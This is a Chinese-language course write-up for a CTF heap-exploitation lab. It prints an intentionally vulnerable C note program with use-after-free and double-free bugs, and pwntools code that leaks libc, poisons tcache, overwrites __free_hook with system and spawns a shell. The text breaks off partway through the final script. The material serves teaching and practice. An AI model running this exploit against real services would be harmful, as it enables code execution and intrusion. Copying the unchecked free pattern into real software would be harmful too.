<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN 0x39(Lab - Double Free)
  #


  Background
  #

0x18(Lab - babynote)

  Source code
  #

:::spoiler Source Code
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>

struct note
{
	char *content;
	unsigned long len;
};

struct note notes[0x10];

int read_int()
{
	char buf[0x20];
	read(0, buf, 0x1f);
	return atoi(buf);
}

unsigned long read_ul()
{
	char buf[0x20];
	read(0, buf, 0x1f);
	return strtoul(buf, NULL, 10);
}

int get_idx()
{
	int idx = read_int();
	if (idx >= 0x10 || idx < 1)
		exit(0);
	return idx;
}

void add_note()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	printf("Length: ");
	notes[idx].len = read_ul();
	notes[idx].content = malloc(notes[idx].len);
	puts("Add done");
}

void read_note()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	printf("Note[%d]:\n", idx);
	write(1, notes[idx].content, notes[idx].len);
}

void write_note()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	printf("Content: ");
	read(0, notes[idx].content, notes[idx].len);
}

void delete_note()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	free(notes[idx].content);
	puts("Delete done");
}

void memu()
{
	puts("1. add note");
	puts("2. read note");
	puts("3. write note");
	puts("4. delete note");
	printf("choice: ");
}

int main(void)
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	int fd = open("./flag.txt", O_RDONLY);
	notes[0].len = 0x30;
	notes[0].content = malloc(0x30);
	read(fd, notes[0].content, 0x30);
	close(fd);

	for (;;)
	{
		memu();
		int choice = read_int();
		switch (choice)
		{
		case 1:
			add_note();
			break;
		case 2:
			read_note();
			break;
		case 3:
			write_note();
			break;
		case 4:
			delete_note();
			break;
		default:
			puts("Invalid command");
		}
	}
	return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x39(Lab - Double Free)"><meta property="og:description" content='Simple PWN 0x39(Lab - Double Free) # Background # 0x18(Lab - babynote)
Source code # :::spoiler Source Code
#include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/types.h> #include <fcntl.h> struct note { char *content; unsigned long len; }; struct note notes[0x10]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } unsigned long read_ul() { char buf[0x20]; read(0, buf, 0x1f); return strtoul(buf, NULL, 10); } int get_idx() { int idx = read_int(); if (idx >= 0x10 || idx < 1) exit(0); return idx; } void add_note() { int idx; printf("Index: "); idx = get_idx(); printf("Length: "); notes[idx].len = read_ul(); notes[idx].content = malloc(notes[idx].len); puts("Add done"); } void read_note() { int idx; printf("Index: "); idx = get_idx(); printf("Note[%d]:\n", idx); write(1, notes[idx].content, notes[idx].len); } void write_note() { int idx; printf("Index: "); idx = get_idx(); printf("Content: "); read(0, notes[idx].content, notes[idx].len); } void delete_note() { int idx; printf("Index: "); idx = get_idx(); free(notes[idx].content); puts("Delete done"); } void memu() { puts("1. add note"); puts("2. read note"); puts("3. write note"); puts("4. delete note"); printf("choice: "); } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); int fd = open("./flag.txt", O_RDONLY); notes[0].len = 0x30; notes[0].content = malloc(0x30); read(fd, notes[0].content, 0x30); close(fd); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: add_note(); break; case 2: read_note(); break; case 3: write_note(); break; case 4: delete_note(); break; default: puts("Invalid command"); } } return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>Simple PWN 0x39(Lab - Double Free) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x39(Lab - Double Free)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a><ul><li><a href=#前置作業-leak-libc-address>前置作業: Leak Libc Address</a></li><li><a href=#方法一-double-fee>方法一: Double Fee</a></li><li><a href=#方法二-一般的寫入>方法二: 一般的寫入</a></li></ul></li><li><a href=#exploit---leak-libcuaf--double-free>Exploit - Leak Libc(UAF) + Double Free(?)</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x39lab---double-free>Simple PWN 0x39(Lab - Double Free)
<a class=anchor href=#simple-pwn-0x39lab---double-free>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://hackmd.io/@SBK6401/rkD83kaji>0x18(Lab - <code>babynote</code>)</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>note</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>content;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> len;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>note</span> notes[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>read_int</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x1f</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> atoi(buf);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>read_ul</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x1f</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> strtoul(buf, NULL, <span style=color:#ae81ff>10</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>get_idx</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (idx <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0x10</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> idx;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>add_note</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Length: &#34;</span>);
</span></span><span style=display:flex><span>	notes[idx].len <span style=color:#f92672>=</span> read_ul();
</span></span><span style=display:flex><span>	notes[idx].content <span style=color:#f92672>=</span> malloc(notes[idx].len);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Add done&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>read_note</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Note[%d]:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, idx);
</span></span><span style=display:flex><span>	write(<span style=color:#ae81ff>1</span>, notes[idx].content, notes[idx].len);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>write_note</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Content: &#34;</span>);
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, notes[idx].content, notes[idx].len);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>delete_note</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	free(notes[idx].content);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Delete done&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>memu</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;1. add note&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;2. read note&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;3. write note&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;4. delete note&#34;</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;choice: &#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	setvbuf(stdin, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	setvbuf(stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;./flag.txt&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>	notes[<span style=color:#ae81ff>0</span>].len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x30</span>;
</span></span><span style=display:flex><span>	notes[<span style=color:#ae81ff>0</span>].content <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x30</span>);
</span></span><span style=display:flex><span>	read(fd, notes[<span style=color:#ae81ff>0</span>].content, <span style=color:#ae81ff>0x30</span>);
</span></span><span style=display:flex><span>	close(fd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (;;)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		memu();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>int</span> choice <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>switch</span> (choice)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			add_note();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			read_note();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			write_note();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			delete_note();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			puts(<span style=color:#e6db74>&#34;Invalid command&#34;</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>:::warning
Run On Ubuntu 20.04
:::
這一題有很多種方式可以拿到shell，不過原理都是一樣的，前置作業都是一樣的，也就是要利用UAF去leak出libc address，接著算出<code>__free_hook</code>以及<code>system</code>的位址，接著想辦法把<code>system</code>寫到<code>__free_hook</code>的位址，此時就有兩種方式可以寫，一種是利用此次學到的double free，把值寫到最後一個在tcache的free chunk，蓋掉他的fd，接著就可以用add_note把tcache的值要回來，並寫system的address進到__free_hook；另一種方式就比較簡單，也就是把free chunk的fd利用UAF的特性改掉，並且直接add_note把東西從tcache要回來，之後就一樣寫system_addr，後free掉一個帶有/bin/sh的chunk，此時就會開一個shell給我們了</p><h3 id=前置作業-leak-libc-address>前置作業: Leak Libc Address
<a class=anchor href=#%e5%89%8d%e7%bd%ae%e4%bd%9c%e6%a5%ad-leak-libc-address>#</a></h3><p>關於這一點可以參考<a href=https://hackmd.io/@SBK6401/SJWc9v4Bp#%E5%A6%82%E4%BD%95%E7%94%A8UAF-leak-libc-address>如何用UAF leak libc address?</a>，方法都一樣，首先要想辦法讓free chunk進到unsorted bin中(最簡單的方法就是設定超過0x410的空間)，接著因為malloc的時候沒有實作清空原本的資料，導致我們可以leak其中有關libc section的資訊。底下的設定意思是我們先設定三個notes，#14的意思是不要讓#13被free掉的時候被consolidate用的，接著我們把前兩個free掉，結果如下
<img src=https://hackmd.io/_uploads/r14opZfL6.png alt=image>
會發現#12和#13被consolidate在一起了，接著我們看其中的一些資訊
<img src=https://hackmd.io/_uploads/SJwX0-GIT.png alt=image>
裡面確實存著libc相關的資訊，接著只要把這一塊chunk malloc出去給隨便一個note，接著讀其中的資料就可以讀出libc address了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add_note(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>13</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>read_note(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak_libc <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>8</span>))
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> leak_libc <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1ed0e0</span>
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>free_hook <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1eee48</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leak Libc = </span><span style=color:#e6db74>{</span>hex(leak_libc)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Libc Base = </span><span style=color:#e6db74>{</span>hex(libc_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;System Address = </span><span style=color:#e6db74>{</span>hex(system_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Free Hook = </span><span style=color:#e6db74>{</span>hex(free_hook)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>0x420</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>)
</span></span></code></pre></div><h3 id=方法一-double-fee>方法一: Double Fee
<a class=anchor href=#%e6%96%b9%e6%b3%95%e4%b8%80-double-fee>#</a></h3><p>有了libc address後，我們要想辦法把system address寫到<code>__free_hook</code>的位置，如果是要用double free的方法的話可以參考上課的講義:
<img src=https://hackmd.io/_uploads/SJNM1Mf8T.png alt=image></p><p>最簡單的方法是，我把tcache填滿(一定要)，然後用free(a)→free(b)→free(a)的順序產生double free</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0xa</span>):
</span></span><span style=display:flex><span>    add_note(i, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x8</span>):
</span></span><span style=display:flex><span>    del_note(i)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>9</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>8</span>)
</span></span></code></pre></div><p>此時的heapinfo會變成:
<img src=https://hackmd.io/_uploads/H1GGgGM86.png alt=image></p><p>接著我們把tcache清空後再繼續add_note就會把fastbin的free chunk搬到tcache中</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add_note(<span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>0x18</span>)
</span></span></code></pre></div><p><img src=https://hackmd.io/_uploads/B1ErzMM8T.png alt=image></p><p>接著我們寫free_hook address到note #8，這樣的話，tcache的順序就會變成下圖:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>write_note(<span style=color:#ae81ff>8</span>, p64(free_hook))
</span></span></code></pre></div><p><img src=https://hackmd.io/_uploads/rktIXGMIp.png alt=image></p><p>此時我們就把free chunk變成free_hook的地址，我們只不斷的add_note，就可以把tcache的free chunk要回來進行寫入，也就是寫system address:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>bin_sh <span style=color:#f92672>=</span> u64(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>9</span>, p64(bin_sh))
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>11</span>, p64(system_addr))
</span></span></code></pre></div><p><img src=https://hackmd.io/_uploads/SydnNzMIa.png alt=image></p><p>最後的結果如上圖，會發現note #11已經變成==0x7f900aa8ae48==，這個就是<code>__free_hook</code>的位址，進去看發現已經被我們寫入system address，這個時候我們只要把含有<code>/bin/sh\x00</code>的note #9 free掉，就可以開shell了</p><h3 id=方法二-一般的寫入>方法二: 一般的寫入
<a class=anchor href=#%e6%96%b9%e6%b3%95%e4%ba%8c-%e4%b8%80%e8%88%ac%e7%9a%84%e5%af%ab%e5%85%a5>#</a></h3><p>這一個方法比較方便，也和double free沒關係，反正我們只要利用UAF的特性，也可以把free chunk的fd改掉，再用像前面的方法就可以開shell</p><p>下面的建構就是先開兩個note，然後free掉，此時我們就可以利用UAF的漏洞把free chunk的fd改掉，結果如下圖
<img src=https://hackmd.io/_uploads/B1ohIMz86.png alt=image></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add_note(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>1</span>, p64(free_hook) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>)
</span></span></code></pre></div><p>接著就把<code>/bin/sh\x00</code>寫到note #2，接著就不斷add_note，把<code>__free_hook</code>的address拿到手，然後再把system address寫到<code>__free_hook</code>，最後把含有<code>/bin/sh\x00</code>的note #2 free掉，結果如下圖:
<img src=https://hackmd.io/_uploads/HkGsPGfL6.png alt=image>
從上圖得知，note #4的address已經被我們換成<code>__free_hook</code> address，並且實際跟進去就是system address，最後只要free掉note #2就可以開shell了</p><h2 id=exploit---leak-libcuaf--double-free>Exploit - Leak Libc(UAF) + Double Free(?)
<a class=anchor href=#exploit---leak-libcuaf--double-free>#</a></h2><p>:::spoiler Method 1</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./chal&#39;</span>)
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.113.184.121&#39;</span>, <span style=color:#ae81ff>10058</span>)
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>add_note</span>(idx, len):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;choice: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Index: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(idx)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Length: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(len)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_note</span>(idx):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;choice: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Index: &#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>send(str(idx)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>write_note</span>(idx, content):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;choice: &#39;</span>)
